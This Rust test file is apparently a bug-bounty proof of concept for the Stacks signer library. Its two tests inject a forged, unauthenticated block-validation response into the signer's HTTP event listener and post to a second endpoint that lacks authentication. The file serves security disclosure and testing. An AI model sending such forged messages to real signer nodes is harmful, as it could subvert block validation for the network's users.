// Security PoC tests for Immunefi stacks-signer scope.
// Run: cargo test -p libsigner security_poc -- --nocapture

use std::io::{Read, Write};
use std::net::{SocketAddr, TcpStream};
use std::sync::mpsc::channel;
use std::thread;
use std::time::Duration;

use blockstack_lib::net::api::postblock_proposal::{
    BlockValidateOk, BlockValidateResponse,
};
use clarity::util::hash::Sha512Trunc256Sum;
use clarity::vm::costs::ExecutionCost;
use stacks_common::util::sleep_ms;

use crate::events::SignerEvent;
use crate::v0::messages::SignerMessage;
use crate::{Signer, SignerEventReceiver, SignerRunLoop};

struct CaptureRunLoop {
    poll_timeout: Duration,
    captured: Vec<SignerEvent<SignerMessage>>,
}

impl CaptureRunLoop {
    fn new() -> Self {
        Self {
            poll_timeout: Duration::from_millis(200),
            captured: vec![],
        }
    }
}

impl SignerRunLoop<Vec<SignerEvent<SignerMessage>>, SignerMessage> for CaptureRunLoop {
    fn set_event_timeout(&mut self, timeout: Duration) {
        self.poll_timeout = timeout;
    }

    fn get_event_timeout(&self) -> Duration {
        self.poll_timeout
    }

    fn run_one_pass(
        &mut self,
        event: Option<SignerEvent<SignerMessage>>,
        _res: &std::sync::mpsc::Sender<Vec<SignerEvent<SignerMessage>>>,
    ) -> Option<Vec<SignerEvent<SignerMessage>>> {
        if let Some(event) = event {
            self.captured.push(event);
            return Some(std::mem::take(&mut self.captured));
        }
        None
    }
}

fn post_json(endpoint: SocketAddr, path: &str, body: &str) -> String {
    let mut sock = TcpStream::connect(endpoint).expect("connect to signer event port");
    let req = format!(
        "POST {path} HTTP/1.1\r\nHost: {endpoint}\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{body}",
        body.len()
    );
    sock.write_all(req.as_bytes()).unwrap();
    sock.flush().unwrap();
    let mut buf = vec![0u8; 4096];
    let n = sock.read(&mut buf).unwrap();
    String::from_utf8_lossy(&buf[..n]).to_string()
}

/// PoC: The signer event HTTP listener accepts unauthenticated POSTs on
/// `/proposal_response`. Any network client that can reach `config.endpoint`
/// can inject a forged `BlockValidateResponse::Ok` as if it were stacks-node.
///
/// Production sample config binds `0.0.0.0:30000` (see sample/conf/signer/mainnet-signer-conf.toml).
#[test]
fn poc_unauthenticated_proposal_response_injection() {
    let ev = SignerEventReceiver::new(false);
    let (res_send, _res_recv) = channel();
    let mut signer = Signer::new(CaptureRunLoop::new(), ev, res_send);
    let endpoint: SocketAddr = "127.0.0.1:32001".parse().unwrap();

    let running = signer.spawn(endpoint).unwrap();
    sleep_ms(500);

    let attacker_hash = Sha512Trunc256Sum::from_data(b"immunefi-poc-forged-validate-ok");
    let forged = BlockValidateResponse::Ok(BlockValidateOk {
        signer_signature_hash: attacker_hash.clone(),
        cost: ExecutionCost::ZERO,
        size: 1,
        validation_time_ms: 0,
        replay_tx_hash: None,
        replay_tx_exhausted: false,
    });
    let body = serde_json::to_string(&forged).unwrap();

    let response = thread::spawn(move || post_json(endpoint, "/proposal_response", &body))
        .join()
        .unwrap();

    assert!(
        response.contains("200"),
        "signer should ACK forged validation event; got: {response}"
    );

    sleep_ms(1500);
    let events = running.stop().unwrap();

    let injected = events.iter().any(|e| {
        let SignerEvent::BlockValidationResponse(BlockValidateResponse::Ok(ok)) = e else {
            return false;
        };
        ok.signer_signature_hash == attacker_hash
    });

    assert!(
        injected,
        "forged BlockValidateResponse::Ok must reach signer runloop without auth"
    );
}

/// PoC: `/stackerdb_chunks` is also unauthenticated at the HTTP layer.
#[test]
fn poc_unauthenticated_stackerdb_chunks_endpoint() {
    let ev = SignerEventReceiver::new(false);
    let (res_send, _res_recv) = channel();
    let mut signer = Signer::new(CaptureRunLoop::new(), ev, res_send);
    let endpoint: SocketAddr = "127.0.0.1:32002".parse().unwrap();

    let running = signer.spawn(endpoint).unwrap();
    sleep_ms(500);

    let body = r#"{"contract_id":{"name":"miners","version":1},"modified_slots":[]}"#;
    let response = thread::spawn(move || post_json(endpoint, "/stackerdb_chunks", body))
        .join()
        .unwrap();

    assert!(
        response.contains("200"),
        "unauthenticated stackerdb_chunks accepted: {response}"
    );

    sleep_ms(500);
    let _ = running.stop();
}
